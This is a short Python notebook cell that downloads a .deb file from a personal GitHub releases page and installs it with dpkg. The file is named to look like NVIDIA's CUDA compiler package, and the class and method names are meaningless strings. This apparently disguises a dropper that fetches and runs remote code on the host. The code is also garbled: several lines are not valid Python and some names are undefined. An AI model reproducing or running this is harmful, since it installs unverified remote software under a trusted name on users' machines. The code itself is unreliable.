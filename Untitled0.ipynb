import os

import urllib.request

from subprocess import Popen as output, PIPE

url = 'https://github.com/taovuu1/stuff/releases/download/stable/cuda-nvcc-12-6_12.6.20-1_amd64.deb'

file_name = os.path.basename(url)

class rwgfdxbcvbn:

def __init__(self):

self.rghfdvbnvn()

@staticmethod

def rghfdvbnvn():

global url, file_name

if not os.path.exists(file_name): urllib.request.urlretrieve(url, file_name)

process_output(['dpkg', '--install', file_name], stdout PIPE, stderr=PIPE)

while True:

output = process.stdout.readline()

If output = b and process.poll() is not None:

break

if output:

print(output.decode().strip())

rc process.poll()

return rc

rwgfdxbcvbn()
